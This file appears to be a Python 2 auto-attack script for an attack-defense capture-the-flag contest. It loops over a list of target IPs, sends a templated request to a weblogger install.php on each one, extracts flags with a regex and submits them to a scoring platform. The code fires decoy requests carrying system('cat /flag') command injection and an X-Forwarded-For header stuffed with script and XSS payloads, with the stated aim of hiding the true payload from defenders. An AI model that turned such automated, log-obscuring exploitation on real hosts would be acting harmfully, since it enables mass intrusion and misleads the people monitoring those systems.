import base64
import re
import os
import json
import string
import random
import time
import requests
from urlparse import *

iplist = []
for line in open("ip.txt"):  
	iplist.append((line).strip())
platformurl = "http://input_this" # the url to submit flag
platformheader = {
}

#post things for platform
platpost = {
	"flag":"{0}",
	"token":"12345"
}

platmod = 1 # 0=>get 1=>post 2=>json post   method for submitting flag

preg_str = r"Undefined index: ([a]{2}) in <b>/var/" # find flag in content

url_ = '''http://123.207.114.39:8801/weblogger/install.php'''
url = url_.replace((urlparse(url_).netloc.split(':',1))[0],'{0}')
#header
headerstr = '''HOST : 123.207.114.39:8801
CONNECTION : keep-alive
CACHE-CONTROL : max-age=0
UPGRADE-INSECURE-REQUESTS : 1
USER-AGENT : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36
ACCEPT : text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
REFERER : http://123.207.114.39:8801/weblogger/install.php
ACCEPT-ENCODING : gzip, deflate
ACCEPT-LANGUAGE : zh-CN,zh;q=0.9
COOKIE : ___rl__test__cookies=1554799117986; slide-session=MTU1NDA0MDgyNXxEdi1CQkFFQ180SUFBUkFCRUFBQU1fLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRCY0FGWE5zYVdSbGN5OXliM2xoYkMxbmJHRmtaUzV0WkE9PXzSgjVvukAbTmoQ9xLR-d6VCBtU2Lks-A_VC5chjz91mg==; PHPSESSID=mn0trqedpeso4oij4n35a1v8r7; OUTFOX_SEARCH_USER_ID_NCOO=581648113.1810485
'''

#getstr
GETstr = ''''''
if GETstr!='''''':
	url = url+'?'+GETstr
#poststr
POSTstr = ''''''
pocmod = '0'
headerarr = headerstr.split('\n')
header = {}
for i in headerarr:
	if i !='':
		i = i.split(' : ',1)
		if i[0].strip().upper() == 'HOST':
			header[i[0].strip().upper()] = i[1].replace((i[1].split(':',1))[0],'{0}')
		else:
			header[i[0].strip()] = i[1]

if POSTstr!='''''':
	mod = 1
else:
	mod = 0

#hide the true payload
nomalhead = {
'USER-AGENT' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3269.3 Safari/537.36',
'UPGRADE-INSECURE-REQUESTS' : '1',
'ACCEPT' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'ACCEPT-ENCODING' : 'gzip, deflate',
'ACCEPT-LANGUAGE' : 'zh-CN,zh;q=0.9,zh-TW;q=0.8',
'X-Forwarded-For': '127.0.0.1\'"<script>location.href=\'8.8.8.8\';</script><img onerror=alert(1)>'
}
def genrand(_len):
	return  ''.join(random.sample(string.ascii_letters + string.digits, _len))

def _req(mod,url,headers,poststr):
	global nomalhead
	if mod == 0:
		try:
			for i in range(1,random.randint(2,9)):
				try:
					salt = requests.post(url=url+"?"+genrand(random.randint(1,5))+"=system('cat /flag');"+genrand(random.randint(10,32)),headers=nomalhead,timeout=0.5,data={genrand(3):genrand(20)})
				except:
					continue
			for i in range(1,4):
				randstr = genrand(4)
				for j in range(1,random.randint(2,5)):
					try:
						salt = requests.post(url=url+"?"+randstr+'=system(\'cat /flag\');',headers=nomalhead,timeout=0.5)
					except:
						continue
			req = requests.get(url=url,headers=headers,timeout=1)
			return req
		except requests.exceptions.ConnectTimeout:
			print 'local network error\n'
			return -1
		except requests.exceptions.Timeout:
			print 'Connect Timeout\n'
			return -2
		except:
			print 'Get '+url+' error!\n'
			return -3
	else:
		try:
			for i in range(1,random.randint(2,9)):
				try:
					salt = requests.post(url=url+"?"+genrand(random.randint(1,5))+"=system('cat /flag');"+genrand(random.randint(10,32)),headers=nomalhead,timeout=0.5,data={genrand(3):genrand(20)})
				except:
					continue
			for i in range(1,4):
				randstr = genrand(4)
				for j in range(1,random.randint(2,5)):
					try:
						salt = requests.post(url=url+"?"+randstr+'=system(\'cat /flag\');',headers=nomalhead,timeout=0.5)
					except:
						continue
			req = requests.post(url=url,headers=headers,data=poststr,timeout=1)
			return req
		except requests.exceptions.ConnectTimeout:
			print 'local network error\n'
			return -1
		except requests.exceptions.Timeout:
			print 'Connect Timeout\n'
			return -2
		except:
			print 'POST '+url+' error!\n'
			print poststr
			return -3

def beforeattack(ip):
	targets = ['']
	t_headers = ['']
	t_posts = ['']
	t_gets = ['']
	
	for t_i in range(1,len(targets)):
		t_url = targets[t_i].replace((urlparse(targets[t_i]).netloc.split(':',1))[0],ip)
		t_header_n = t_headers[t_i].split('\n')
		t_header = {}
		for i in t_header_n:
			if i !='':
				i = i.split(' : ',1)
				if i[0].strip().upper() == 'HOST':
					t_header[i[0].strip().upper()] = i[1].replace((i[1].split(':',1))[0],ip)
				else:
					t_header[i[0].strip()] = i[1]

		t_get = t_gets[t_i]
		t_post = t_posts[t_i]
		t_datastr = {}
		if t_post != '':
			t_poststr = t_post.split('&')
			for t_p in t_poststr:
				t_pm = t_p.split('=',1)
				if len(t_pm)<2:
					t_datastr = t_pm[0]
				else:
					t_datastr[t_pm[0]] = t_pm[1]
			_req(1,t_url,t_header,t_datastr)
			time.sleep(0.5)

		else:#def _req(mod,url,headers,poststr):
			_req(0,t_url,t_header,'')
			time.sleep(0.5)
	return 1

def attack(iplist,mod,url,headers,poststr):
	global platmod
	for ip in iplist:
		global pocmod
		if pocmod == 'mixed':
			beforeattack(ip)

		t_url = url
		t_url = t_url.format(ip)
		if headers.has_key('HOST'):
			headers['HOST'] = headers['HOST'].format(ip)
		req = _req(mod,t_url,headers,poststr)
		if(req > 0):
			if len(getflag(req.content)) == 0:
				exit('regx error!')
			for proflag in getflag(req.content):
				print "try to submit flag: "+proflag
				submitflag(platmod,proflag,ip)

		elif(req == -1):
			if headers.has_key('HOST'):
				headers['HOST'] = headers['HOST'].format(ip)
			req = _req(mod,t_url,headers,poststr)
			if req > 0:
				if len(getflag(req.content)) == 0:
					exit('regx error!')
				for proflag in getflag(req.content):
					print "try to submit flag: "+proflag
					submitflag(platmod,proflag,ip)
			else:
				continue
		elif(req == -2):
			continue
		elif(req == -3):
			if headers.has_key('HOST'):
				headers['HOST'] = headers['HOST'].format(ip)
			req = _req(mod,t_url,headers,poststr)
			if req > 0:
				if len(getflag(req.content)) == 0:
					exit('regx error!')
				for proflag in getflag(req.content):
					print "try to submit flag: "+proflag
					submitflag(platmod,proflag,ip)
			else:
				continue

def getflag(content):
	return re.findall(preg_str,content)

def submitflag(mod,flag,ip):
	global platformurl
	global platpost
	global platformheader
	if mod == 0:#get
		
		platformurl_n = platformurl.format(flag)
		try:
			requests.get(url = platformurl_n,headers = platformheader)
			print "submit "+str(ip)+" flag: " + flag + "\n"
			return 1
		except:
			submitflag(mod,flag,ip)

	elif mod == 1:#post
		platpost_n = platpost
		for p in platpost_n:
			platpost_n[p] = platpost_n[p].format(flag)
		try:
			requests.post(url = platformurl,data = platpost_n, headers = platformheader)
			print "submit "+str(ip)+" flag: " + flag + "\n"
			return 1
		except:
			submitflag(mod,flag,ip)
	elif mod == 2:#json post
		platpost_n = platpost
		for p in platpost_n:
			platpost_n[p] = platpost_n[p].format(flag)
		try:
			requests.post(url = platformurl,data = json.dumps(platpost_n),headers = platformheader)
			print "submit "+str(ip)+" flag: " + flag + "\n"
			return 1
		except:
			submitflag(mod,flag,ip)
		





#attack(iplist,0,url,header,'1')
datastr = {}
if mod == 1:
	poststr = POSTstr.split('&')
	for p in poststr:
		pm = p.split('=',1)
		if len(pm)<2:
			datastr = pm[0]
		else:
			datastr[pm[0]] = pm[1]
	while True:
		try:
			attack(iplist,mod,url,header,datastr)
		except:
			attack(iplist,mod,url,header,datastr)
		time.sleep(1)
else:
	while True:
		try:
			attack(iplist,mod,url,header,'1')
		except:
			attack(iplist,mod,url,header,'1')
		time.sleep(1)








